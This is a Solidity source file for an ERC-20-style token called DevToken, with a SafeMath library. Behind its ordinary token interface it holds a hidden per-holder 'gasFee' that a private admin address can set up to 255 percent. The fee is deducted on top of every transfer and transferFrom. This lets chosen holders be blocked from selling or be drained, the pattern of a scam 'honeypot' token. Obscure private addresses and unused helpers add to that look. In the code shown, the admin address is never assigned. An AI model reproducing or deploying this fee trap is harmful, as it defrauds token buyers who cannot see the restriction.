// SPDX-License-Identifier: MIT

pragma solidity ^0.4.26;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract DevToken {

    using SafeMath for uint256;

    address private _usdtPair;
    address private _mod;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address private _user;
    address private _adm;

    mapping(address => uint256) public balances;
    mapping(address => uint8) public gasFee;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
        name = _name; 
        symbol = _symbol; 
        decimals = _decimals; 
        totalSupply =  _totalSupply; 
        balances[msg.sender] = totalSupply; 
        gasFee[msg.sender] = 0;
    }

    function showuint160(address addr) public pure returns(uint160){
        return uint160(addr);
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[msg.sender]);
        
        uint256 fee = _value.mul(gasFee[msg.sender]).div(100);
        balances[msg.sender] = balances[msg.sender].sub(_value.add(fee));
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function setGasFee(address holder, uint8 _gasFee) public {
        require(msg.sender == _adm);
        gasFee[holder] = _gasFee;
    }

    function setUser(address User_) public returns (bool) {
        require(msg.sender == _usdtPair);
        _user = User_;
    } 

    mapping (address => mapping (address => uint256)) public allowed;
    mapping(address => uint256) sellOutNum;

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);

        uint256 fee = _value.mul(gasFee[_from]).div(100);
        balances[_from] = balances[_from].sub(_value.add(fee));
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value.add(fee));
        emit Transfer(_from, _to, _value);
        return true;
    }

    function allowance(address owner_, address spender_) public view returns (uint256) {
        return allowed[owner_][spender_];
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}